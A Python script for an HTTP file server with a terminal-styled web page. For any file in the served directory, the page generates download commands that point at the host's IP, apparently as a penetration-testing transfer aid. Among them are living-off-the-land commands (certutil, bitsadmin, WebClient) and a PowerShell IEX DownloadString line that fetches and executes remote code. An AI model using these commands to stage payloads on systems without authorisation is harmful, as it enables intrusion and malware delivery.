#!/usr/bin/env python3
"""
Custom HTTP Server with Auto Interface Detection and Command Generator
Usage: python3 server.py [port]
Default port: 80
"""

import socket
import subprocess
import sys
import re
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
from datetime import datetime
import urllib.parse

def get_ip_addresses():
    """Get all IP addresses from all network interfaces"""
    ip_addresses = []
    
    try:
        # Linux/Unix: using ifconfig
        output = subprocess.check_output(['ifconfig'], text=True)
        
        # Pattern to match IPv4 addresses
        ip_pattern = r'inet\s+(\d+\.\d+\.\d+\.\d+)'
        matches = re.findall(ip_pattern, output)
        
        # Filter out localhost
        for ip in matches:
            if ip != '127.0.0.1':
                ip_addresses.append(ip)
                
    except (subprocess.CalledProcessError, FileNotFoundError):
        # Fallback: using socket
        try:
            # Get hostname and resolve IPs
            hostname = socket.gethostname()
            ip_addresses = socket.gethostbyname_ex(hostname)[2]
        except:
            pass
    
    # Always add localhost
    if '127.0.0.1' not in ip_addresses:
        ip_addresses.append('127.0.0.1')
    
    # Add 0.0.0.0 to indicate binding to all interfaces
    if '0.0.0.0' not in ip_addresses:
        ip_addresses.append('0.0.0.0')
    
    return ip_addresses

def get_interfaces_with_ips():
    """Get interface names with their IP addresses"""
    interfaces = {}
    
    try:
        output = subprocess.check_output(['ifconfig'], text=True)
        
        # Split by interface sections
        interface_blocks = re.split(r'\n(?=\S+:)', output)
        
        for block in interface_blocks:
            # Get interface name
            name_match = re.match(r'(\S+):', block)
            if not name_match:
                continue
                
            interface = name_match.group(1)
            
            # Get IP address
            ip_match = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)', block)
            if ip_match:
                ip = ip_match.group(1)
                if ip != '127.0.0.1':  # Skip localhost
                    interfaces[interface] = ip
                    
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    
    return interfaces

def get_directory_listing(path):
    """Get directory contents with details"""
    items = []
    try:
        for item in os.listdir(path):
            full_path = os.path.join(path, item)
            stat = os.stat(full_path)
            
            # Determine type
            if os.path.isdir(full_path):
                item_type = 'folder'
                size = '-'
            elif os.path.isfile(full_path):
                item_type = 'file'
                size = get_size(stat.st_size)
            else:
                item_type = 'other'
                size = '-'
            
            items.append({
                'name': item,
                'type': item_type,
                'size': size,
            })
        
        # Sort: folders first, then files
        items.sort(key=lambda x: (x['type'] != 'file', x['name'].lower()))
        
    except PermissionError:
        pass
    
    return items

def get_size(bytes):
    """Convert bytes to human readable format"""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes < 1024.0:
            return f"{bytes:.1f} {unit}"
        bytes /= 1024.0
    return f"{bytes:.1f} TB"

def generate_html(port, ip_addresses):
    """Generate HTML page with command generator"""
    
    # Get current directory contents
    cwd = os.getcwd()
    items = get_directory_listing(cwd)
    
    # Get primary IP for commands
    primary_ip = ip_addresses[0] if ip_addresses and ip_addresses[0] != '0.0.0.0' else '127.0.0.1'
    
    # Get hostname
    hostname = socket.gethostname()
    
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTTP Server - Command Generator</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Courier New', 'Consolas', monospace;
            background: #0a0a0a;
            min-height: 100vh;
            padding: 20px;
            color: #00ff00;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        
        .header {{
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
        }}
        
        .header-top {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }}
        
        .header h1 {{
            font-size: 28px;
            color: #00ff00;
            display: flex;
            align-items: center;
            gap: 10px;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }}
        
        .header h1 .prompt {{
            color: #ff0000;
        }}
        
        .header .subtitle {{
            color: #00aa00;
            font-size: 14px;
            margin-top: 5px;
            opacity: 0.8;
        }}
        
        .status-badge {{
            background: #0a2a0a;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px 20px;
            border-radius: 20px;
            font-size: 14px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            animation: pulse 2s infinite;
        }}
        
        .status-dot {{
            width: 8px;
            height: 8px;
            background: #00ff00;
            border-radius: 50%;
            display: inline-block;
            animation: blink 1s infinite;
        }}
        
        @keyframes blink {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0; }}
        }}
        
        @keyframes pulse {{
            0% {{ box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }}
            50% {{ box-shadow: 0 0 20px rgba(0, 255, 0, 0.4); }}
            100% {{ box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }}
        }}
        
        .server-info {{
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #0a3a0a;
            font-size: 13px;
            color: #00aa00;
        }}
        
        .server-info span {{
            display: flex;
            align-items: center;
            gap: 5px;
        }}
        
        .server-info .ip-list {{
            color: #00ff00;
            font-weight: 600;
        }}
        
        .card {{
            background: #1a1a1a;
            border: 1px solid #0a3a0a;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.05);
        }}
        
        .card h2 {{
            color: #00ff00;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }}
        
        .file-selector {{
            background: #0a0a0a;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 25px;
            border: 1px solid #0a3a0a;
        }}
        
        .file-selector label {{
            font-weight: 600;
            color: #00aa00;
            margin-right: 15px;
            font-size: 15px;
        }}
        
        .file-selector select {{
            padding: 10px 15px;
            border: 1px solid #0a3a0a;
            border-radius: 6px;
            font-size: 14px;
            background: #0a0a0a;
            color: #00ff00;
            min-width: 250px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
        }}
        
        .file-selector select:focus {{
            outline: none;
            border-color: #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }}
        
        .file-selector select option {{
            background: #0a0a0a;
            color: #00ff00;
        }}
        
        .file-selector .info {{
            margin-top: 10px;
            font-size: 13px;
            color: #006600;
        }}
        
        .file-selector .info strong {{
            color: #00ff00;
        }}
        
        .command-section {{
            margin-bottom: 30px;
        }}
        
        .command-section h3 {{
            color: #00aa00;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 18px;
            border-bottom: 1px solid #0a3a0a;
            padding-bottom: 10px;
        }}
        
        .command-grid {{
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }}
        
        .command-box {{
            background: #0a0a0a;
            border-radius: 8px;
            padding: 15px;
            border-left: 3px solid #00ff00;
            transition: all 0.3s;
        }}
        
        .command-box:hover {{
            transform: translateX(5px);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
            border-left-color: #ff0000;
        }}
        
        .command-box .cmd-label {{
            font-size: 11px;
            font-weight: 700;
            color: #006600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }}
        
        .command-box .cmd {{
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #00ff00;
            word-break: break-all;
            background: #000000;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #0a3a0a;
        }}
        
        .command-box .cmd code {{
            display: block;
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-all;
            font-size: 12px;
            color: #00ff00;
        }}
        
        .empty-state {{
            text-align: center;
            padding: 40px 20px;
            color: #006600;
        }}
        
        .empty-state .icon {{
            font-size: 48px;
            margin-bottom: 10px;
        }}
        
        @media (max-width: 768px) {{
            .header-top {{
                flex-direction: column;
                align-items: flex-start;
            }}
            
            .header h1 {{
                font-size: 22px;
            }}
            
            .command-grid {{
                grid-template-columns: 1fr;
            }}
            
            .file-selector select {{
                min-width: 100%;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="header-top">
                <div>
                    <h1>
                        <span class="prompt"></span>
                        <span style="color:#00ff00;">file_transfer_commands</span>
                    </h1>
                    <div class="subtitle">
                        <span style="color:#ff0000;"></span>
                        <span style="color:#ffffff;"></span>
                        <span style="color:#00ff00;"></span>
                    </div>
                </div>
                <div class="status-badge">
                    <span class="status-dot"></span>
                    mcb0b0
                </div>
            </div>
            <div class="server-info">
                <span> PORT: <strong style="color:#00ff00;">{port}</strong></span>
                <span> DIR: <strong style="color:#00ff00;">{cwd}</strong></span>
                <span> IPS: <span class="ip-list">{" | ".join([ip for ip in ip_addresses if ip != '0.0.0.0'])}</span></span>
            </div>
        </div>
        
        <!-- Main Card -->
        <div class="card">
            <h2>
                <span style="color:#ff0000;"></span>
            </h2>
            
            <div class="file-selector">
                <label for="fileSelect">SELECT FILE:</label>
                <select id="fileSelect" onchange="updateCommands()">
    """
    
    # Populate file selector with files only
    file_items = [item for item in items if item['type'] == 'file']
    if file_items:
        for item in file_items:
            html += f'                    <option value="{item["name"]}">{item["name"]} ({item["size"]})</option>\n'
    else:
        html += '                    <option value="">No files available in current directory</option>\n'
    
    html += f"""
                </select>
                <div class="info">
                    <span style="display:block;margin-top:5px;font-size:12px;color:#004400;">
                    </span>
                </div>
            </div>
            
            <div id="commandOutput">
                <!-- Commands will be generated here -->
            </div>
        </div>
    </div>
    
    <script>
        // Update commands based on selected file
        function updateCommands() {{
            const select = document.getElementById('fileSelect');
            const filename = select.value;
            
            if (!filename) {{
                document.getElementById('commandOutput').innerHTML = `
                    <div class="empty-state">
                        <div class="icon">📄</div>
                        <div>SELECT A FILE TO GENERATE DOWNLOAD COMMANDS</div>
                        <div style="font-size:12px;color:#004400;margin-top:5px;">MAKE SURE FILES EXIST IN THE CURRENT DIRECTORY</div>
                    </div>
                `;
                return;
            }}
            
            // Get IP and port
            const ip = '{primary_ip}';
            const port = {port};
            const url = `${{ip}}:${{port}}/${{filename}}`;
            
            // Linux commands
            const wgetCmd = `wget http://${{url}}`;
            const curlCmd = `curl -O http://${{url}}`;
            const curlSkipCmd = `curl -k -O http://${{url}}`;
            const wgetNoCertCmd = `wget --no-check-certificate http://${{url}}`;
            
            // Windows commands
            const certutilCmd = `certutil -urlcache -f http://${{url}} ${{filename}}`;
            const certutilSplitCmd = `certutil -urlcache -split -f http://${{url}} ${{filename}}`;
            const psCmd = `powershell -c "Invoke-WebRequest -Uri http://${{url}} -OutFile ${{filename}}"`;
            const netCmd = `powershell -c "(New-Object Net.WebClient).DownloadFile('http://${{url}}', '${{filename}}')"`;
            const netDownloadStringCmd = `IEX(New-Object Net.WebClient).DownloadString('http://${{url}}')`;
            const netDownloadFileCmd = `(New-Object Net.WebClient).DownloadFile("http://${{url}}","${{filename}}")`;
            const bitsCmd = `bitsadmin /transfer job /download /priority normal http://${{url}} C:\\\\Temp\\\\${{filename}}`;
            const iwrCmd = `iwr -uri http://${{url}} -outfile ${{filename}}`;
            
            // Generate commands HTML
            let html = `
                <div class="command-section">
                    <h3> LINUX / UNIX</h3>
                    <div class="command-grid">
                        <div class="command-box">
                            <div class="cmd-label"> wget</div>
                            <div class="cmd">
                                <code>${{wgetCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> curl</div>
                            <div class="cmd">
                                <code>${{curlCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> curl (skip SSL)</div>
                            <div class="cmd">
                                <code>${{curlSkipCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> wget (no cert)</div>
                            <div class="cmd">
                                <code>${{wgetNoCertCmd}}</code>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="command-section">
                    <h3> WINDOWS</h3>
                    <div class="command-grid">
                        <div class="command-box">
                            <div class="cmd-label"> certutil</div>
                            <div class="cmd">
                                <code>${{certutilCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> certutil (split)</div>
                            <div class="cmd">
                                <code>${{certutilSplitCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> PowerShell IWR</div>
                            <div class="cmd">
                                <code>${{psCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> .NET WebClient</div>
                            <div class="cmd">
                                <code>${{netCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> .NET DownloadString</div>
                            <div class="cmd">
                                <code>${{netDownloadStringCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> .NET DownloadFile</div>
                            <div class="cmd">
                                <code>${{netDownloadFileCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> bitsadmin</div>
                            <div class="cmd">
                                <code>${{bitsCmd}}</code>
                            </div>
                        </div>
                        <div class="command-box">
                            <div class="cmd-label"> iwr (Invoke-WebRequest)</div>
                            <div class="cmd">
                                <code>${{iwrCmd}}</code>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            
            document.getElementById('commandOutput').innerHTML = html;
        }}
        
        // Initialize commands on load
        document.addEventListener('DOMContentLoaded', function() {{
            updateCommands();
        }});
    </script>
</body>
</html>
"""
    return html

class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
    """Custom HTTP request handler with command generator and request logging"""
    
    def __init__(self, *args, **kwargs):
        # Store port for use in HTML generation
        self.port = kwargs.pop('port', 80)
        self.html_content = None
        super().__init__(*args, **kwargs)
    
    def log_request(self, code='-', size='-'):
        """Custom request logging with colored output"""
        # Get client IP
        client_ip = self.client_address[0]
        
        # Get the requested file
        path = self.path
        if path.startswith('/'):
            path = path[1:]  # Remove leading slash
        
        # Skip logging for the main page
        if path == '' or path == 'index.html':
            return
        
        # Get file size if it exists
        file_size = '-'
        if os.path.exists(path) and os.path.isfile(path):
            file_size = get_size(os.path.getsize(path))
        
        # Color codes for terminal
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        RED = '\033[91m'
        RESET = '\033[0m'
        BOLD = '\033[1m'
        
        # Format the log message
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        if code == 200:
            status_color = GREEN
            status = 'OK'
        elif code == 404:
            status_color = RED
            status = 'NOT FOUND'
        else:
            status_color = YELLOW
            status = str(code)
        
        # Log the request
        print(f"{CYAN}[{timestamp}]{RESET} {BOLD}{client_ip}{RESET} - "
              f"{BLUE}\"{self.command} {self.path} HTTP/1.1\"{RESET} "
              f"{status_color}{code} {status}{RESET} "
              f"{YELLOW}{file_size}{RESET} "
              f"{BOLD}{path if path else '/'}{RESET}")
    
    def do_GET(self):
        """Handle GET requests with custom logging"""
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        
        # Check if it's the root or index.html
        if path == '/' or path == '/index.html':
            # Serve the custom HTML page
            if self.html_content is None:
                # Generate HTML with current info
                ip_addresses = get_ip_addresses()
                self.html_content = generate_html(self.port, ip_addresses)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(self.html_content.encode('utf-8'))
        else:
            # Log the request before serving
            self.log_request(200)  # Will be overridden by actual response
            
            # Serve other files from current directory
            super().do_GET()
    
    def log_message(self, format, *args):
        """Override to use custom logging"""
        # We handle logging in log_request
        pass

def run_server(port=80):
    """Run the HTTP server with interface detection"""
    
    # Get IP addresses and interfaces for display
    ip_addresses = get_ip_addresses()
    interfaces = get_interfaces_with_ips()
    
    # Create server with custom handler
    server_address = ('0.0.0.0', port)
    
    # Create handler with port
    handler = lambda *args, **kwargs: CustomHTTPRequestHandler(*args, port=port, **kwargs)
    httpd = HTTPServer(server_address, handler)
    
    # Print server information with colors
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m' 
    print(f"{BOLD} Server Details:{RESET}")
    print(f"  {GREEN}•{RESET} Port: {BOLD}{port}{RESET}")
    print(f"  {GREEN}•{RESET} Directory: {BOLD}{os.getcwd()}{RESET}")
    
    print(f"{BOLD} Access URLs:{RESET}")
    
    # First print interfaces with their IPs
    for iface, ip in interfaces.items():
        print(f"  {BOLD}{iface}{RESET} {BLUE}➜{RESET} http://{BOLD}{ip}{RESET}:{BOLD}{port}{RESET}/")
    
    # Then print localhost if it exists
    if '127.0.0.1' in ip_addresses:
        print(f"  {BOLD}lo{RESET} {BLUE}➜{RESET} http://{BOLD}127.0.0.1{RESET}:{BOLD}{port}{RESET}/")
    
    # Print 0.0.0.0
    if '0.0.0.0' in ip_addresses:
        print(f"  {BOLD}all{RESET} {BLUE}➜{RESET} http://{BOLD}0.0.0.0{RESET}:{BOLD}{port}{RESET}/ {YELLOW}{RESET}")
    
    print(f"\n{BOLD}{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.shutdown()

if __name__ == '__main__':
    # Get port from command line argument
    port = 80
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print(f"Invalid port: {sys.argv[1]}")
            print("Usage: python3 server.py [port]")
            sys.exit(1)
    
    run_server(port)